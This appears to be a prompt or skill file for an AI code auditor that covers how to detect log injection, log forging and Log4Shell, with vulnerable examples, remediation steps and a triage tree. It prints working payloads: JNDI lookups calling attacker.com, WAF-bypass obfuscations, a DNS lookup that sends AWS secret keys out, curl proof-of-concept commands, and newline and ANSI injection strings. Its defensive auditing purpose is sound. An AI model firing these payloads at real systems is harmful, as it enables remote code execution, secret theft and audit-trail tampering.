---
name: log-injection-audit
description: Detection methodology for log injection and log forging
---

# Domain Expertise

# Log Injection/Forgery Auditor

## Expertise

You are a log injection specialist with deep knowledge of logging frameworks, log parsing systems, and the downstream security implications of log manipulation. You understand how SIEM systems, log aggregators, and monitoring tools process logs, and how attackers can exploit log injection to hide attacks, forge evidence, or execute code through log parsing vulnerabilities. Your expertise includes the infamous Log4Shell (CVE-2021-44228) and similar lookup-based attacks.

## Core Proficiency

- **Log formats**: Understanding structured and unstructured logging
- **Downstream parser risks**: SIEM, Splunk, ELK stack vulnerabilities
- **Lookup mechanisms**: JNDI, variable interpolation in logging frameworks
- **Log integrity**: Detecting and preventing log forgery

## Focus Areas

### Newlines in Log Messages
```python
# VULNERABLE: User input directly in log
def log_login(username):
    logger.info(f"User login attempt: {username}")

# Attack: username = "admin\n2024-01-01 12:00:00 INFO Login successful: admin"
# Creates fake log entry showing successful login

# VULNERABLE: Format string logging
logger.info("Processing request from %s" % user_input)
```

### Format String in Logs
```python
# VULNERABLE: User input as format string
logger.info(user_controlled_string)

# Attack: user_controlled_string = "%(password)s"
# May leak sensitive data from logging context

# Java format string
logger.info(String.format(userInput, args));
# Attack: %n%n%n%n creates newlines
```

### Log4j Style Lookups (JNDI)
```java
// VULNERABLE: Log4j before 2.17.0
logger.info("User-Agent: " + userAgent);

// Attack: ${jndi:ldap://attacker.com/exploit}
// Triggers JNDI lookup and potential RCE

// Other dangerous lookups:
// ${jndi:rmi://attacker.com/obj}
// ${jndi:dns://attacker.com}
// ${jndi:iiop://attacker.com/obj}
```

### SIEM/Parser Exploitation
```python
# If logs are parsed as CSV
username = 'admin","","admin_action","success'
# Could corrupt CSV parsing in log analyzer

# If logs are parsed as JSON
username = '","role":"admin","original":"'
# Could inject JSON fields in structured logs
```

## Red Flags and Warning Signs

1. **User input in log messages**: Any logging with unsanitized user data
2. **Log4j/Log4j2 usage**: Check version for JNDI vulnerability
3. **Format strings from input**: %s, {} with user-controlled templates
4. **Structured logging**: JSON/XML logs with user values
5. **Error messages with user data**: Exception messages including input
6. **Audit logs**: User actions logged for compliance
7. **Request/Response logging**: Headers, bodies logged verbatim
8. **Debug logging in production**: Verbose logging with user data

## Attack Patterns

### Fake Log Entry Creation
```
# Basic newline injection
admin\n2024-01-01 12:00:00 INFO [AUTH] Login successful for user: admin

# Timestamp spoofing
admin\n1999-01-01 00:00:00 INFO [SECURITY] System compromised

# Create plausible cover story
failed_user\n2024-01-01 12:00:00 ERROR [DB] Database connection timeout - retrying
```

### Log Parsing Exploitation
```
# CSV log injection
admin","","delete_all","success","","

# JSON log injection (if logs are JSON per line)
admin","severity":"critical","action":"grant_admin

# Splunk field extraction manipulation
field=value ATTACK_HIDDEN=true
```

### JNDI Lookup Injection (Log4Shell)
```java
// Direct JNDI lookup
${jndi:ldap://attacker.com:1389/Exploit}

// Bypasses for WAF
${${lower:j}ndi:ldap://attacker.com/a}
${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://a.com/a}
${j${::-n}di:ldap://attacker.com/a}

// DNS exfiltration
${jndi:ldap://${env:AWS_SECRET_KEY}.attacker.com/a}

// Other lookups
${env:AWS_SECRET_ACCESS_KEY}
${sys:java.version}
${java:os}
```

### Format String Exploitation
```python
# Python logging format
%(secret)s  # May expose logging context
%(message)s%(message)s  # Duplicate messages

# Java String.format
%n%n%n%n  # Inject newlines
%s%s%s%s%s%s  # Potential crash with missing args

# C-style (in some systems)
%x%x%x%x  # Memory leak
%n  # Write to memory (critical)
```

## Analysis Methodology

1. **Identify logging calls**: Find all logger.info/warn/error/debug
2. **Trace user input**: Map request data to log messages
3. **Check logging framework**: Version and configuration
4. **Review log format**: Structured (JSON) vs unstructured
5. **Audit Log4j usage**: Check for JNDI vulnerability
6. **Examine error logging**: User input in exception messages
7. **Review log consumers**: SIEM, ELK, Splunk configurations
8. **Test newline handling**: Can fake entries be created?

## Common Protection Bypasses

### Log4j Bypass Techniques
```java
// Lowercase bypass
${${lower:j}ndi:ldap://a.com/a}

// Environment variable bypass
${${env:ENV_NAME:-j}ndi:ldap://a.com/a}

// Recursive lookup
${${::-j}${::-n}${::-d}${::-i}:ldap://a.com/a}

// Unicode bypass
${jnd${upper:ı}:ldap://a.com/a}

// URL encoding in LDAP URL
${jndi:ldap://attacker.com/%2561}
```

### Newline Filter Bypass
```
# Unicode newlines
\u000a \u000d
\u2028 \u2029 (line/paragraph separator)

# Encoded variants
%0a %0d
%0A %0D

# HTML entities (if logs rendered in web UI)
&#10; &#13;
```

### Structured Log Injection
```json
// If logging escapes quotes but not backslashes
\"injected\":\"value

// Unicode escape sequences
\u0022injected\u0022:\u0022value\u0022

// Nested object injection
{"nested":{"admin":true}}
```

## Example Vulnerable Code

### Example 1: Authentication Logging
```python
# auth_logger.py - Vulnerable auth logging
import logging

logger = logging.getLogger('auth')

def log_auth_attempt(username, success, ip_address):
    # VULNERABLE: User input directly in log
    if success:
        logger.info(f"Login successful for user '{username}' from {ip_address}")
    else:
        logger.warning(f"Login failed for user '{username}' from {ip_address}")

# Attack: username = "admin' from 10.0.0.1\n2024-01-01 INFO Login successful for user 'admin"
# Creates fake successful login entry that could mislead forensics
```

### Example 2: Java Request Logging
```java
// RequestLogger.java - Vulnerable to Log4Shell
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

@Component
public class RequestLogger {
    private static final Logger logger = LogManager.getLogger();

    public void logRequest(HttpServletRequest request) {
        String userAgent = request.getHeader("User-Agent");
        String referer = request.getHeader("Referer");

        // VULNERABLE: Log4j will process JNDI lookups
        logger.info("Request from UA: {} Referer: {}", userAgent, referer);
    }
}

// Attack: User-Agent: ${jndi:ldap://attacker.com:1389/Exploit}
// Triggers remote code execution via JNDI lookup
```

### Example 3: Audit Log Manipulation
```python
# audit.py - Vulnerable audit logging
import json
import logging

audit_logger = logging.getLogger('audit')

def log_user_action(user_id, action, details):
    # VULNERABLE: Details from user input can corrupt JSON
    log_entry = {
        'user_id': user_id,
        'action': action,
        'details': details,
        'timestamp': datetime.utcnow().isoformat()
    }

    # If details contains JSON special characters
    audit_logger.info(json.dumps(log_entry))

# Attack: details = '","action":"admin_grant","authorized_by":"ceo","original":"'
# Could corrupt JSON parsing in SIEM, showing unauthorized action as authorized
```

## Output Format

```markdown
## Log Injection Finding

**Location**: [file:line]
**Severity**: Critical/High/Medium
**Confidence**: High/Medium/Low

**Logging Framework**: [Log4j/Log4j2/Python logging/etc.]
**Framework Version**: [version if known]

**Vulnerable Code**:
[code block]

**Injection Point**: [parameter/header/variable name]
**Log Type**: [Application/Audit/Security/Access]

**Attack Vector**:
```
[Injection payload]
```

**Impact**:
- Log forgery: [Yes/No - can create fake entries]
- Attack hiding: [Yes/No - can obscure malicious activity]
- Remote code execution: [Yes/No - Log4Shell/JNDI]
- Information disclosure: [Yes/No - via lookups]
- SIEM manipulation: [Yes/No - downstream parser exploitation]

**Downstream Systems Affected**:
- [SIEM/Splunk/ELK/CloudWatch/etc.]

**Proof of Concept**:
```bash
# Newline injection
curl -X POST "http://target/login" \
  -d "username=admin%0a2024-01-01%20INFO%20Login%20successful"

# Log4Shell
curl -H "User-Agent: \${jndi:ldap://attacker.com/a}" http://target/
```

**Remediation**:
1. Sanitize user input before logging (escape newlines, special chars)
2. Use structured logging with proper encoding
3. Update Log4j to 2.17.1+ and disable JNDI lookup
4. Set log4j2.formatMsgNoLookups=true
5. Implement log integrity verification
6. Use parameterized logging: logger.info("User: {}", sanitize(username))
```

---

# Detection Methodology

# Log Injection / Log Forging Detection

## Methodology

### Step 1: Identify Logging Frameworks and Log Sinks

**Python (logging / loguru / structlog):**
```python
logger.info(f"User {username} logged in")         # Injection target
logger.warning("Failed login for %s", username)    # Injection target
# Structured (safer):
structlog.get_logger().info("login", username=username)
```

**Java (Log4j / SLF4J / Logback):**
```java
log.info("User {} logged in", username);           // Injection target
log.error("Error: " + userInput);                  // Injection target
// CRITICAL: Log4j JNDI lookup (CVE-2021-44228)
log.info("User-Agent: {}", request.getHeader("User-Agent"));
```

**Node.js (winston / pino / console):**
```javascript
logger.info(`User ${username} logged in`);         // Injection target
// Structured (safer):
pino().info({ username }, 'User logged in');
```

### Step 2: Identify Log Injection Vectors

**Newline injection (log forging):**
```
# Input: admin\n[2024-01-15 10:00:00] INFO Login successful for admin
# Creates fake log entry indistinguishable from real ones
```

**ANSI escape sequences:** `\x1b[2J` (clear screen), `\x1b[31mFAKE ALERT\x1b[0m` (red text)

**Log4j JNDI lookup (Log4Shell):**
```
${jndi:ldap://attacker.com/exploit}
# Obfuscated: ${${lower:j}ndi:ldap://attacker.com/x}
# Obfuscated: ${j${::-n}di:ldap://attacker.com/x}
```

**Format string injection:**
```python
logger.info(user_input)  # If input = "%(asctime)s" -- leaks log format
```

### Step 3: Trace User Input to Log Statements

Common sources: form fields, query params, HTTP headers (User-Agent, Referer), exception messages containing user input.

```python
username = request.form['username']
logger.info(f"Login attempt for {username}")       # Direct
user_agent = request.headers.get('User-Agent')     # Fully attacker-controlled
logger.debug(f"User-Agent: {user_agent}")
```

### Step 4: Detect Log4Shell (JNDI Lookup) Vulnerability

```xml
<!-- VULNERABLE: Log4j 2.0 through 2.16.0 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
<!-- SAFE: 2.17.1+ -->
```

Mitigations: `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` (partial), `-Dlog4j2.formatMsgNoLookups=true`, removing `JndiLookup.class` from jar.

### Step 5: Check for Structured Logging

Structured logging (JSON) escapes newlines in field values, preventing log forging.

```python
# VULNERABLE: plain text
logging.basicConfig(format='%(asctime)s %(message)s')
logger.info(f"User {username} action")  # Newlines create fake entries

# SAFER: structured JSON
structlog.configure(processors=[structlog.processors.JSONRenderer()])
log.info("user_action", username=username)
# Output: {"event": "user_action", "username": "admin\nfake"}
```

```javascript
// SAFER: pino (JSON by default)
pino().info({ username }, 'User action');
// VULNERABLE: winston with simple format
winston.createLogger({ format: winston.format.simple() });
```

### Step 6: Evaluate Log Consumers

| Destination | Risk |
|---|---|
| Terminal | ANSI escape attacks, visual spoofing |
| Plain text files | Log forging, evidence tampering |
| SIEM (Splunk, ELK) | Query injection, false alerts |
| Compliance/audit | Evidence tampering, regulatory violation |

## Decision Tree

```
User input reaches log statement?
|
+-- NO --> SAFE
|
+-- YES
    |
    Log4j 2.x version < 2.17.1?
    +-- YES --> VULNERABLE (Critical) -- Log4Shell RCE
    +-- NO
        |
        Structured logging (JSON output)?
        |
        +-- YES (input in field values) --> HARDENED (Low)
        +-- NO (plain text)
            |
            Newline/CRLF sanitization applied?
            +-- YES --> HARDENED (Low)
            +-- NO
                |
                Logs used for security/audit?
                +-- YES --> VULNERABLE (High)
                +-- NO  --> VULNERABLE (Medium)
```

## Real-World Examples

### Example 1: Log4Shell (CVE-2021-44228)

```java
@PostMapping("/api/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    log.info("Login attempt for user: {}", request.getUsername());
    User user = userService.authenticate(request.getUsername(), request.getPassword());
    if (user != null) return ResponseEntity.ok(generateToken(user));
    log.warn("Failed login for: {}", request.getUsername());
    return ResponseEntity.status(401).body("Invalid credentials");
}
```

**Why vulnerable:** Log4j 2.x evaluates JNDI lookups in log messages. Attacker submits `username=${jndi:ldap://attacker.com:1389/Exploit}`, triggering remote class loading and RCE.

**Impact:** Unauthenticated RCE. One of the most severe vulnerabilities in computing history.

**Fix:**
```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.21.1</version>
</dependency>
```

### Example 2: Audit Trail Tampering in Python

```python
@app.route('/transfer', methods=['POST'])
def transfer_funds():
    recipient = request.form['recipient']
    amount = request.form['amount']
    logger.info(f"Fund transfer: {session['username']} -> {recipient}, ${amount}")
    if process_transfer(session['username'], recipient, float(amount)):
        logger.info(f"Transfer successful: {session['username']} -> {recipient}, ${amount}")
```

**Why vulnerable:** Attacker submits `recipient=alice\n2024-01-15 10:00:00 INFO Transfer successful: admin -> attacker, $1000000`. Fake log entries appear to show approved large transfers.

**Impact:** Audit trail tampering. Deceives analysts, undermines SOX/PCI-DSS compliance.

**Fix:**
```python
def sanitize_for_log(value):
    return re.sub(r'[\r\n]', ' ', re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', str(value)))

recipient = sanitize_for_log(request.form['recipient'])
# Better: use structured logging
logger.info("fund_transfer", extra={"sender": sender, "recipient": recipient})
```

### Example 3: ANSI Escape Injection in Node.js

```javascript
const logger = winston.createLogger({
    format: winston.format.combine(winston.format.colorize(), winston.format.simple()),
    transports: [new winston.transports.Console(), new winston.transports.File({filename: 'app.log'})]
});

app.post('/api/feedback', (req, res) => {
    logger.info(`Feedback from ${req.body.name}: ${req.body.message}`);
});
```

**Why vulnerable:** Attacker submits `name=\x1b[2J\x1b[H\x1b[31mCRITICAL: Database breach\x1b[0m`. ANSI sequences clear terminal and display fake red alert.

**Impact:** Operational deception. Can exploit terminal emulator vulnerabilities.

**Fix:**
```javascript
function stripAnsi(str) {
    return str.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '').replace(/[\r\n\x00-\x1f\x7f]/g, '');
}
const logger = winston.createLogger({
    format: winston.format.combine(sanitizeFormat(), winston.format.json())
});
```

## Common False Positive Patterns

1. **Structured JSON logging** -- structlog, pino, winston JSON format auto-escape newlines in field values.

2. **Server-generated identifiers in logs** -- UUIDs, auto-increment IDs, timestamps are not user-controllable.

3. **Hardcoded log messages** -- `logger.info("Application started")` has no injection surface.

4. **Web server access logs** -- Apache/Nginx typically handle encoding of special characters.

5. **Validated input before logging** -- Admin endpoints with enum/numeric-only fields validated before logging.

6. **Python %s placeholders** -- `logger.info("User %s", username)` is injectable for newlines but not a format string vulnerability.

7. **Test logging** -- `assertLogs`/`caplog` in tests are not production surfaces.
